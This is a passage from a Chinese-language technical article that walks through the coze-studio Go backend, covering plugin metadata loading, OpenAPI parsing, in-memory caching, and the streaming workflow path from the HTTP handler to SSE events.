    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tools) &gt; <span class="hljs-number">0</span> {
        <span class="hljs-comment">// 发现冲突，返回错误</span>
        conflictsIDs := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int64</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(tools))
        <span class="hljs-keyword">for</span> _, t := <span class="hljs-keyword">range</span> tools {
            conflictsIDs = <span class="hljs-built_in">append</span>(conflictsIDs, t.ID)
        }
        <span class="hljs-keyword">return</span> errorx.New(errno.ErrToolIDExist, ...)
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}
</code></pre>
<h4 data-id="heading-16">3. 配置初始化</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// backend/domain/plugin/conf/config.go</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitConfig</span><span class="hljs-params">(ctx context.Context)</span></span> (err <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. 获取当前工作目录</span>
    cwd, err := os.Getwd()
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        logs.Warnf(<span class="hljs-string">"[InitConfig] Failed to get current working directory: %v"</span>, err)
        cwd = os.Getenv(<span class="hljs-string">"PWD"</span>)
    }
    
    <span class="hljs-comment">// 2. 构建插件配置路径</span>
    basePath := path.Join(cwd, <span class="hljs-string">"resources"</span>, <span class="hljs-string">"conf"</span>, <span class="hljs-string">"plugin"</span>)
    logs.CtxInfof(ctx, <span class="hljs-string">"basePath=%s"</span>, basePath)
    
    <span class="hljs-comment">// 3. 加载插件产品元数据</span>
    err = loadPluginProductMeta(ctx, basePath)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> err
    }
    
    <span class="hljs-comment">// 4. 加载 OAuth Schema</span>
    err = loadOAuthSchema(ctx, basePath)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> err
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}
</code></pre>
<h3 data-id="heading-17">3.2 插件产品元数据加载</h3>
<p>插件产品元数据存储在 <code>backend/conf/plugin/pluginproduct/</code> 目录下，采用 YAML 格式：</p>
<p><strong>元数据结构</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">plugin_id:</span> <span class="hljs-number">1001</span>                    <span class="hljs-comment"># 插件 ID</span>
<span class="hljs-attr">deprecated:</span> <span class="hljs-literal">false</span>                   <span class="hljs-comment"># 是否已废弃</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">"1.0.0"</span>                    <span class="hljs-comment"># 版本号（需符合 semver）</span>
<span class="hljs-attr">plugin_type:</span> <span class="hljs-string">PLUGIN</span>                 <span class="hljs-comment"># 插件类型</span>
<span class="hljs-attr">openapi_doc_file:</span> <span class="hljs-string">"weather.yaml"</span>    <span class="hljs-comment"># OpenAPI 文档文件名</span>
<span class="hljs-attr">manifest:</span>                           <span class="hljs-comment"># 插件清单</span>
  <span class="hljs-attr">api:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">"openapi"</span>                 <span class="hljs-comment"># API 类型</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">"https://api.example.com"</span>  <span class="hljs-comment"># 服务器 URL</span>
  <span class="hljs-attr">name_for_human:</span> <span class="hljs-string">"天气插件"</span>        <span class="hljs-comment"># 显示名称</span>
<span class="hljs-attr">tools:</span>                              <span class="hljs-comment"># 工具列表</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">tool_id:</span> <span class="hljs-number">2001</span>                   <span class="hljs-comment"># 工具 ID</span>
    <span class="hljs-attr">deprecated:</span> <span class="hljs-literal">false</span>               <span class="hljs-comment"># 是否已废弃</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"GET"</span>                   <span class="hljs-comment"># HTTP 方法</span>
    <span class="hljs-attr">sub_url:</span> <span class="hljs-string">"/weather"</span>             <span class="hljs-comment"># 子路径</span>
</code></pre>
<p><strong>加载流程</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[读取 plugin_meta.yaml] --&gt; B[解析 YAML 元数据]
    B --&gt; C{检查元数据有效性}
    C --&gt;|无效| D[跳过该插件]
    C --&gt;|有效| E[验证 Manifest]
    E --&gt; F[加载 OpenAPI 文档]
    F --&gt; G[验证 OpenAPI 文档]
    G --&gt; H[解析 API 路径和方法]
    H --&gt; I[匹配工具与 API]
    I --&gt; J{匹配成功?}
    J --&gt;|否| K[记录错误日志]
    J --&gt;|是| L[创建 PluginInfo]
    L --&gt; M[创建 ToolInfo]
    M --&gt; N[注册到内存缓存]
    N --&gt; O[下一个插件]
    D --&gt; O
    K --&gt; O
</code></pre>
<p><strong>关键代码</strong>：<code>backend/domain/plugin/conf/load_plugin.go</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">loadPluginProductMeta</span><span class="hljs-params">(ctx context.Context, basePath <span class="hljs-type">string</span>)</span></span> (err <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. 读取元数据文件</span>
    metaFile := path.Join(root, <span class="hljs-string">"plugin_meta.yaml"</span>)
    file, err := os.ReadFile(metaFile)
    
    <span class="hljs-comment">// 2. 解析 YAML</span>
    <span class="hljs-keyword">var</span> pluginsMeta []*pluginProductMeta
    err = yaml.Unmarshal(file, &amp;pluginsMeta)
    
    <span class="hljs-comment">// 3. 遍历每个插件元数据</span>
    <span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> pluginsMeta {
        <span class="hljs-comment">// 4. 检查元数据有效性</span>
        <span class="hljs-keyword">if</span> !checkPluginMetaInfo(ctx, m) {
            <span class="hljs-keyword">continue</span>
        }
        
        <span class="hljs-comment">// 5. 验证 Manifest</span>
        err = m.Manifest.Validate(<span class="hljs-literal">true</span>)
        
        <span class="hljs-comment">// 6. 加载 OpenAPI 文档</span>
        docPath := path.Join(root, m.OpenapiDocFile)
        loader := openapi3.NewLoader()
        _doc, err := loader.LoadFromFile(docPath)
        
        <span class="hljs-comment">// 7. 验证 OpenAPI 文档</span>
        err = doc.Validate(ctx)
        
        <span class="hljs-comment">// 8. 创建 PluginInfo</span>
        pi := &amp;PluginInfo{
            Info: &amp;model.PluginInfo{
                ID:         m.PluginID,
                PluginType: m.PluginType,
                Version:    ptr.Of(m.Version),
                ServerURL:  ptr.Of(doc.Servers[<span class="hljs-number">0</span>].URL),
                Manifest:   m.Manifest,
                OpenapiDoc: doc,
            },
            ToolIDs: <span class="hljs-built_in">make</span>([]<span class="hljs-type">int64</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(m.Tools)),
        }
        
        <span class="hljs-comment">// 9. 解析 API 路径和方法</span>
        apis := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[dto.UniqueToolAPI]*model.Openapi3Operation)
        <span class="hljs-keyword">for</span> subURL, pathItem := <span class="hljs-keyword">range</span> doc.Paths {
            <span class="hljs-keyword">for</span> method, op := <span class="hljs-keyword">range</span> pathItem.Operations() {
                api := dto.UniqueToolAPI{
                    SubURL: subURL,
                    Method: strings.ToUpper(method),
                }
                apis[api] = model.NewOpenapi3Operation(op)
            }
        }
        
        <span class="hljs-comment">// 10. 匹配工具与 API</span>
        <span class="hljs-keyword">for</span> _, t := <span class="hljs-keyword">range</span> m.Tools {
            api := dto.UniqueToolAPI{
                SubURL: t.SubURL,
                Method: strings.ToUpper(t.Method),
            }
            op, ok := apis[api]
            <span class="hljs-keyword">if</span> !ok {
                <span class="hljs-keyword">continue</span>
            }
            
            <span class="hljs-comment">// 11. 创建 ToolInfo</span>
            toolProducts[t.ToolID] = &amp;ToolInfo{
                Info: &amp;entity.ToolInfo{
                    ID:        t.ToolID,
                    PluginID:  m.PluginID,
                    Method:    ptr.Of(t.Method),
                    SubURL:    ptr.Of(t.SubURL),
                    Operation: op,
                },
            }
            
            pi.ToolIDs = <span class="hljs-built_in">append</span>(pi.ToolIDs, t.ToolID)
        }
        
        <span class="hljs-comment">// 12. 注册到内存缓存</span>
        pluginProducts[m.PluginID] = pi
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}
</code></pre>
<h3 data-id="heading-18">3.3 OpenAPI 文档解析</h3>
<p>OpenAPI 文档解析使用 <code>github.com/getkin/kin-openapi</code> 库：</p>
<p><strong>解析步骤</strong>：</p>
<ol>
<li><strong>加载文档</strong>：从文件系统读取 YAML/JSON 格式的 OpenAPI 文档</li>
<li><strong>解析结构</strong>：解析为 <code>openapi3.T</code> 结构体</li>
<li><strong>验证规范</strong>：验证文档是否符合 OpenAPI 3.0 规范</li>
<li><strong>提取操作</strong>：提取每个路径的操作（GET、POST 等）</li>
<li><strong>构建 Schema</strong>：构建参数和响应的 Schema 定义</li>
</ol>
<p><strong>关键数据结构</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> PluginInfo <span class="hljs-keyword">struct</span> {
    Info    *model.PluginInfo      <span class="hljs-comment">// 插件基本信息</span>
    ToolIDs []<span class="hljs-type">int64</span>                <span class="hljs-comment">// 工具 ID 列表</span>
}

<span class="hljs-keyword">type</span> ToolInfo <span class="hljs-keyword">struct</span> {
    Info *entity.ToolInfo          <span class="hljs-comment">// 工具信息</span>
}

<span class="hljs-keyword">type</span> ToolInfo <span class="hljs-keyword">struct</span> {
    ID              <span class="hljs-type">int64</span>
    PluginID        <span class="hljs-type">int64</span>
    Version         *<span class="hljs-type">string</span>
    Method          *<span class="hljs-type">string</span>         <span class="hljs-comment">// HTTP 方法</span>
    SubURL          *<span class="hljs-type">string</span>         <span class="hljs-comment">// 子路径</span>
    Operation       *model.Openapi3Operation  <span class="hljs-comment">// OpenAPI 操作定义</span>
    ActivatedStatus *<span class="hljs-type">int32</span>
    DebugStatus     *<span class="hljs-type">int32</span>
}
</code></pre>
<h3 data-id="heading-19">3.4 插件注册与缓存</h3>
<p>插件加载完成后，会注册到内存缓存中：</p>
<p><strong>缓存结构</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">var</span> (
    pluginProducts <span class="hljs-keyword">map</span>[<span class="hljs-type">int64</span>]*PluginInfo  <span class="hljs-comment">// 插件 ID -&gt; PluginInfo</span>
    toolProducts   <span class="hljs-keyword">map</span>[<span class="hljs-type">int64</span>]*ToolInfo    <span class="hljs-comment">// 工具 ID -&gt; ToolInfo</span>
)
</code></pre>
<p><strong>访问接口</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 获取插件产品信息</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetPluginProduct</span><span class="hljs-params">(pluginID <span class="hljs-type">int64</span>)</span></span> (*PluginInfo, <span class="hljs-type">bool</span>)

<span class="hljs-comment">// 批量获取插件产品信息</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MGetPluginProducts</span><span class="hljs-params">(pluginIDs []<span class="hljs-type">int64</span>)</span></span> []*PluginInfo

<span class="hljs-comment">// 获取工具产品信息</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetToolProduct</span><span class="hljs-params">(toolID <span class="hljs-type">int64</span>)</span></span> (*ToolInfo, <span class="hljs-type">bool</span>)

<span class="hljs-comment">// 批量获取工具产品信息</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MGetToolProducts</span><span class="hljs-params">(toolIDs []<span class="hljs-type">int64</span>)</span></span> []*ToolInfo
</code></pre>
<p><strong>特点</strong>：</p>
<ul>
<li>✅ <strong>线程安全</strong>：使用深拷贝返回，避免并发修改</li>
<li>✅ <strong>快速访问</strong>：O(1) 时间复杂度</li>
<li>✅ <strong>启动时加载</strong>：应用启动时一次性加载，运行时只读</li>
</ul>
<p>可以看到，当前 coze-studio 是在服务启动时，会加载 <code>coze-studio/backend/resources/conf/plugin/pluginproduct/plugin_meta.yaml</code> 这个文件，内部会解析后缓存到内存中。</p>
<h2 data-id="heading-20">插件执行流程</h2>
<h3 data-id="heading-21">4.1 执行场景</h3>
<p>插件可以在多种场景下执行，定义在 <code>backend/crossdomain/plugin/consts/consts.go</code>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> ExecuteScene <span class="hljs-type">string</span>

<span class="hljs-keyword">const</span> (
    ExecSceneOfOnlineAgent ExecuteScene = <span class="hljs-string">"online_agent"</span>   <span class="hljs-comment">// 在线 Agent</span>
    ExecSceneOfDraftAgent ExecuteScene = <span class="hljs-string">"draft_agent"</span>    <span class="hljs-comment">// 草稿 Agent</span>
    ExecSceneOfWorkflow    ExecuteScene = <span class="hljs-string">"workflow"</span>      <span class="hljs-comment">// Workflow</span>
    ExecSceneOfToolDebug   ExecuteScene = <span class="hljs-string">"tool_debug"</span>     <span class="hljs-comment">// 工具调试</span>
)
</code></pre>
<h3 data-id="heading-22">4.2 StreamWriter/StreamReader 工作原理</h3>
<p>理解执行流程前，先看 coze-studio 的流式输出机制：<strong>StreamWriter/StreamReader</strong>。</p>
<h4 data-id="heading-23">4.2.1 Pipe 机制</h4>
<p><code>StreamWriter</code> 和 <code>StreamReader</code> 通过 <code>schema.Pipe()</code> 创建，形成生产者-消费者通道：</p>
<pre><code class="hljs language-go" lang="go">sr, sw := schema.Pipe[*entity.Message](<span class="hljs-number">10</span>)  <span class="hljs-comment">// 缓冲区大小为 10</span>
</code></pre>
<p>工作方式：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[StreamWriter&lt;br/&gt;生产者] --&gt;|Send| B[Channel Buffer&lt;br/&gt;容量: 10]
    B --&gt;|Recv| C[StreamReader&lt;br/&gt;消费者]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#e1f5ff
</code></pre>
<p>特性：</p>
<ol>
<li><strong>线程安全</strong>：内部使用 channel，支持并发读写</li>
<li><strong>缓冲机制</strong>：缓冲区满时 <code>Send</code> 阻塞，空时 <code>Recv</code> 阻塞</li>
<li><strong>流式传输</strong>：逐条消息传输，无需等待完整结果</li>
<li><strong>错误传播</strong>：<code>Send(msg, err)</code> 可传递错误，<code>Recv()</code> 返回该错误</li>
</ol>
<p>实现（<code>github.com/cloudwego/eino/schema/stream.go</code>）：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Pipe</span>[<span class="hljs-title">T</span> <span class="hljs-title">any</span>]<span class="hljs-params">(<span class="hljs-built_in">cap</span> <span class="hljs-type">int</span>)</span></span> (*StreamReader[T], *StreamWriter[T]) {
    stm := newStream[T](<span class="hljs-built_in">cap</span>)
    <span class="hljs-keyword">return</span> stm.asReader(), &amp;StreamWriter[T]{stm: stm}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sw *StreamWriter[T])</span></span> Send(chunk T, err <span class="hljs-type">error</span>) (closed <span class="hljs-type">bool</span>) {
    <span class="hljs-keyword">return</span> sw.stm.send(chunk, err)
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sr *StreamReader[T])</span></span> Recv() (T, <span class="hljs-type">error</span>) {
    <span class="hljs-keyword">return</span> sr.stm.recv()
}
</code></pre>
<h4 data-id="heading-24">4.2.2 消息流转路径</h4>
<p>Workflow 流式执行中的消息流转：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[LLM 节点回调处理器] --&gt;|llmRef.realtimeWriter.Send&lt;br/&gt;msg| B[StreamWriter&lt;br/&gt;Workflow 层]
    B --&gt;|写入 channel buffer| C[Channel Buffer&lt;br/&gt;容量: 10]
    C --&gt;|应用层 Recv| D[StreamReader&lt;br/&gt;Workflow 层]
    D --&gt;|转换函数调用| E[应用层转换函数&lt;br/&gt;convertToChatFlowRunResponseList]
    E --&gt;|转换为 SSE 格式| F[StreamReader&lt;br/&gt;SSE 层]
    F --&gt;|Handler 层 Recv| G[SSE Writer]
    G --&gt;|Write event| H[前端 SSE 连接]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#fff4e1
    style E fill:#e1ffe1
    style F fill:#fff4e1
    style G fill:#ffe1f5
    style H fill:#e1f5ff
</code></pre>
<p>说明：</p>
<ul>
<li><code>llmRef.realtimeWriter</code> 是 Workflow 层创建的 <code>StreamWriter</code>，绑定在执行上下文</li>
<li>消息通过 Pipe 的 channel buffer 传递，实现异步非阻塞传输</li>
<li>应用层通过 <code>StreamReader.Recv()</code> 循环接收消息，转换为 SSE 事件格式</li>
</ul>
<h3 data-id="heading-25">4.3 完整执行流程概览</h3>
<p>下面用一个 Workflow 示例，说明从 HTTP API 请求到 SSE 响应的端到端流程。</p>
<p>执行场景：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[开始节点] --&gt;|输入| B[LLM节点&lt;br/&gt;配置新闻插件]
    B --&gt;|Function Calling| C[新闻插件节点&lt;br/&gt;调用外部API]
    C --&gt;|结果| D[结束节点]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e1f5ff
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76304dc6f253405792d1d50bd4a7c398~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGV2WUs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765634928&amp;x-signature=lt8vLrTLCEBZ1IQVDcSLXSTA0Zc%3D" alt="image-20251129195047360" loading="lazy"/></p>
<p>完整流程：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Frontend
    participant HTTPHandler
    participant AppService
    participant WorkflowEngine
    participant StreamWriter
    participant SSEWriter
    participant LLMNode
    participant PluginService
    participant ExternalAPI
    
    Note over Frontend: 1. 前端发起 HTTP 请求
    Frontend-&gt;&gt;HTTPHandler: POST /v1/workflows/chat&lt;br/&gt;{workflow_id, messages, ...}
    
    Note over HTTPHandler: 2. Handler 层处理
    HTTPHandler-&gt;&gt;HTTPHandler: 创建 SSE Writer&lt;br/&gt;设置响应头
    HTTPHandler-&gt;&gt;AppService: OpenAPIChatFlowRun(req)
    
    Note over AppService: 3. 应用层启动 Workflow
    AppService-&gt;&gt;AppService: 解析请求参数&lt;br/&gt;创建会话/轮次
    AppService-&gt;&gt;WorkflowEngine: StreamRun(ctx, input, opts)
    
    Note over WorkflowEngine: 4. Workflow 引擎执行
    WorkflowEngine-&gt;&gt;WorkflowEngine: 创建 StreamWriter&lt;br/&gt;绑定到执行上下文
    WorkflowEngine-&gt;&gt;LLMNode: Stream(ctx, input)
    
    Note over LLMNode: 5. LLM 节点流式执行
    LLMNode-&gt;&gt;LLMNode: 调用 LLM（带工具）
    LLM--&gt;&gt;LLMNode: Stream Output (逐字输出)
    LLMNode-&gt;&gt;StreamWriter: Send(Message{Content: "被"})
    StreamWriter-&gt;&gt;AppService: 消息事件
    AppService-&gt;&gt;SSEWriter: Write(Event{type: "conversation.message.delta"})
    SSEWriter--&gt;&gt;Frontend: data: {"content":"被",...}
    
    Note over LLMNode,PluginService: 6. Function Calling 调用插件
    LLM--&gt;&gt;LLMNode: Function Call: get_news()
    LLMNode-&gt;&gt;PluginService: ExecuteTool(req)
    PluginService-&gt;&gt;ExternalAPI: HTTP Request
    ExternalAPI--&gt;&gt;PluginService: Response
    PluginService--&gt;&gt;LLMNode: 新闻数据
    LLMNode-&gt;&gt;StreamWriter: Send(ToolResponse)
    StreamWriter-&gt;&gt;AppService: 工具响应事件
    AppService-&gt;&gt;SSEWriter: Write(Event{type: "conversation.message.delta"})
    SSEWriter--&gt;&gt;Frontend: data: {"type":"answer",...}
    
    Note over WorkflowEngine: 7. Workflow 完成
    WorkflowEngine-&gt;&gt;StreamWriter: Send(StateMessage{Status: Completed})
    StreamWriter-&gt;&gt;AppService: 完成事件
    AppService-&gt;&gt;SSEWriter: Write(Event{type: "conversation.done"})
    SSEWriter--&gt;&gt;Frontend: data: {"status":"completed"}
    SSEWriter--&gt;&gt;Frontend: [SSE 连接关闭]
    
    Note over Frontend: 8. 前端轮询执行状态
    Frontend-&gt;&gt;HTTPHandler: GET /api/workflow_api/get_process&lt;br/&gt;?workflow_id=xxx&amp;execute_id=xxx
    HTTPHandler-&gt;&gt;AppService: GetProcess(req)
    AppService-&gt;&gt;AppService: 查询执行记录&lt;br/&gt;转换节点结果
    AppService--&gt;&gt;HTTPHandler: {executeStatus, nodeResults, ...}
    HTTPHandler--&gt;&gt;Frontend: JSON Response
</code></pre>
<p>步骤：</p>
<ol>
<li><strong>HTTP API 入口</strong>：前端发起 <code>POST /v1/workflows/chat</code> 请求</li>
<li><strong>创建 SSE 连接</strong>：Handler 层创建 SSE Writer，设置响应头为 <code>text/event-stream</code></li>
<li><strong>启动 Workflow</strong>：应用层解析参数，创建会话和轮次，调用领域服务执行 Workflow</li>
<li><strong>创建消息通道</strong>：Workflow 引擎创建 StreamWriter/StreamReader Pipe，绑定到执行上下文</li>
<li><strong>LLM 节点构建</strong>：解析插件配置，构建工具列表和回调处理器</li>
<li><strong>LLM 节点执行</strong>：从执行上下文获取 StreamWriter，设置到 <code>llmRef.realtimeWriter</code></li>
<li><strong>流式输出</strong>：LLM 逐字输出时，回调处理器通过 <code>llmRef.realtimeWriter.Send()</code> 发送消息</li>
<li><strong>Function Calling</strong>：LLM 生成工具调用时，执行插件工具，回调处理器发送工具响应</li>
<li><strong>消息流转</strong>：消息通过 Pipe 传递到应用层，转换为 SSE 事件格式</li>
<li><strong>推送给前端</strong>：Handler 层循环接收消息，通过 SSE Writer 推送给前端</li>
</ol>
<h4 data-id="heading-26">4.3.1 HTTP Handler 接收请求</h4>
<p>代码位置：<code>backend/api/handler/coze/workflow_service.go:1091</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// @router /v1/workflows/chat [POST]</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">OpenAPIChatFlowRun</span><span class="hljs-params">(ctx context.Context, c *app.RequestContext)</span></span> {
    <span class="hljs-comment">// 1. 验证请求参数</span>
    <span class="hljs-keyword">var</span> req workflow.ChatFlowRunRequest
    err = c.BindAndValidate(&amp;req)
    
    <span class="hljs-comment">// 2. 创建 SSE Writer，设置响应头</span>
    w := sse.NewWriter(c)
    c.SetContentType(<span class="hljs-string">"text/event-stream; charset=utf-8"</span>)
    c.Response.Header.Set(<span class="hljs-string">"Cache-Control"</span>, <span class="hljs-string">"no-cache"</span>)
    c.Response.Header.Set(<span class="hljs-string">"Connection"</span>, <span class="hljs-string">"keep-alive"</span>)
    
    <span class="hljs-comment">// 3. 调用应用服务启动 Workflow，返回 StreamReader</span>
    sr, err := appworkflow.SVC.OpenAPIChatFlowRun(ctx, &amp;req)
    
    <span class="hljs-comment">// 4. 循环接收消息并发送 SSE 事件</span>
    sendChatFlowStreamRunSSE(ctx, w, sr)
}
</code></pre>
<h4 data-id="heading-27">4.3.2 SSE 事件发送循环</h4>
<p>代码位置：<code>backend/api/handler/coze/workflow_service.go</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sendChatFlowStreamRunSSE</span><span class="hljs-params">(ctx context.Context, w *sse.Writer, 
    sr *schema.StreamReader[[]*workflow.ChatFlowRunResponse])</span></span> {
    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
        _ = w.Close()
        sr.Close()
    }()
    
    seq := <span class="hljs-type">int64</span>(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">for</span> {
        <span class="hljs-comment">// 从 StreamReader 接收消息（阻塞等待）</span>
        respList, err := sr.Recv()
        
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            <span class="hljs-keyword">if</span> errors.Is(err, io.EOF) {
                <span class="hljs-keyword">break</span>  <span class="hljs-comment">// 流结束</span>
            }
            w.Write(&amp;sse.Event{Type: <span class="hljs-string">"error"</span>, Data: []<span class="hljs-type">byte</span>(err.Error())})
            <span class="hljs-keyword">return</span>
        }
        
        <span class="hljs-comment">// 将每个响应转换为 SSE 事件并发送</span>
        <span class="hljs-keyword">for</span> _, resp := <span class="hljs-keyword">range</span> respList {
            event := &amp;sse.Event{
                ID:   strconv.FormatInt(seq, <span class="hljs-number">10</span>),
                Type: resp.Event,
                Data: []<span class="hljs-type">byte</span>(resp.Data),
            }
            w.Write(event)
            seq++
        }
    }
}
</code></pre>
<p>说明：</p>
<ul>
<li><code>sr.Recv()</code> 阻塞等待，直到有消息写入 StreamWriter</li>
<li>消息通过 Pipe 的 channel buffer 异步传递，实现实时流式输出</li>
<li>每个消息转换为 SSE 事件格式（<code>event: type\ndata: json\n\n</code>）</li>
</ul>
<h4 data-id="heading-28">4.3.3 应用层启动 Workflow</h4>
<p>代码位置：<code>backend/application/workflow/chatflow.go:473</code></p>
<p>应用层负责：</p>
<ol>
<li>解析请求参数，创建会话和轮次</li>
<li>调用领域服务执行 Workflow</li>
<li>将 <code>StreamReader[*entity.Message]</code> 转换为 <code>StreamReader[[]*ChatFlowRunResponse]</code></li>
</ol>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w *ApplicationService)</span></span> OpenAPIChatFlowRun(ctx context.Context, req *workflow.ChatFlowRunRequest) (
    _ *schema.StreamReader[[]*workflow.ChatFlowRunResponse], err <span class="hljs-type">error</span>) {
    
    <span class="hljs-comment">// 1. 解析业务参数</span>
    workflowID := mustParseInt64(req.GetWorkflowID())
    <span class="hljs-comment">// ... 解析其他参数 ...</span>
    
    <span class="hljs-comment">// 2. 创建会话和轮次</span>
    conversationID, sectionID, err := w.getOrCreateConversation(ctx, ...)
    roundID, err := crossagentrun.DefaultSVC().Create(ctx, ...)
    
    <span class="hljs-comment">// 3. 构建执行配置</span>
    exeCfg := workflowModel.ExecuteConfig{
        ID:            workflowID,
        SyncPattern:   workflowModel.SyncPatternStream,
        ConversationID: ptr.Of(conversationID),
        RoundID:        ptr.Of(roundID),
        <span class="hljs-comment">// ...</span>
    }
    
    <span class="hljs-comment">// 4. 调用领域服务执行 Workflow，返回 StreamReader</span>
    sr, err := GetWorkflowDomainSVC().StreamExecute(ctx, exeCfg, parameters)
    
    <span class="hljs-comment">// 5. 将 entity.Message 转换为 ChatFlowRunResponse</span>
    <span class="hljs-keyword">return</span> schema.StreamReaderWithConvert(sr, w.convertToChatFlowRunResponseList(ctx, ...)), <span class="hljs-literal">nil</span>
}
</code></pre>
<p>说明：</p>
<ul>
<li><code>StreamExecute</code> 返回 <code>StreamReader[*entity.Message]</code>，需要转换为 SSE 格式</li>
<li><code>StreamReaderWithConvert</code> 在每次 <code>Recv()</code> 时调用转换函数</li>
<li>转换函数处理不同类型的消息（状态消息、数据消息等），生成对应的 SSE 事件</li>
</ul>
<h4 data-id="heading-29">4.3.4 消息转换函数</h4>
<p>代码位置：<code>backend/application/workflow/chatflow.go:937</code></p>
<p>转换函数将 <code>entity.Message</code> 转换为 SSE 事件格式：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w *ApplicationService)</span></span> convertToChatFlowRunResponseList(ctx context.Context, info convertToChatFlowInfo) 
    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(msg *entity.Message)</span></span> (responses []*workflow.ChatFlowRunResponse, err <span class="hljs-type">error</span>) {
    
    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(msg *entity.Message)</span></span> (responses []*workflow.ChatFlowRunResponse, err <span class="hljs-type">error</span>) {
        <span class="hljs-comment">// 处理状态消息（Workflow 开始/完成/失败）</span>
        <span class="hljs-keyword">if</span> msg.StateMessage != <span class="hljs-literal">nil</span> {
            <span class="hljs-keyword">switch</span> msg.StateMessage.Status {
            <span class="hljs-keyword">case</span> entity.WorkflowSuccess:
                <span class="hljs-keyword">return</span> []*workflow.ChatFlowRunResponse{
                    {Event: <span class="hljs-type">string</span>(vo.ChatFlowCompleted), Data: ...},
                    {Event: <span class="hljs-type">string</span>(vo.ChatFlowDone), Data: ...},
                }, <span class="hljs-literal">nil</span>
            <span class="hljs-keyword">case</span> entity.WorkflowFailed:
                <span class="hljs-keyword">return</span> []*workflow.ChatFlowRunResponse{
                    {Event: <span class="hljs-type">string</span>(vo.ChatFlowError), Data: ...},
                }, <span class="hljs-literal">nil</span>
            <span class="hljs-keyword">case</span> entity.WorkflowRunning:
                <span class="hljs-keyword">return</span> []*workflow.ChatFlowRunResponse{
                    {Event: <span class="hljs-type">string</span>(vo.ChatFlowCreated), Data: ...},
                    {Event: <span class="hljs-type">string</span>(vo.ChatFlowInProgress), Data: ...},
                }, <span class="hljs-literal">nil</span>
            }
        }
        
        <span class="hljs-comment">// 处理数据消息（LLM 增量输出）</span>
        <span class="hljs-keyword">if</span> msg.DataMessage != <span class="hljs-literal">nil</span> &amp;&amp; msg.Type == entity.Answer {
            deltaData, _ := sonic.MarshalString(&amp;vo.MessageDetail{
                Content: msg.Content,  <span class="hljs-comment">// 增量内容（如 "被"）</span>
                <span class="hljs-comment">// ...</span>
            })
            
            <span class="hljs-keyword">if</span> !msg.Last {
                <span class="hljs-comment">// 增量输出：返回 delta 事件</span>
                <span class="hljs-keyword">return</span> []*workflow.ChatFlowRunResponse{
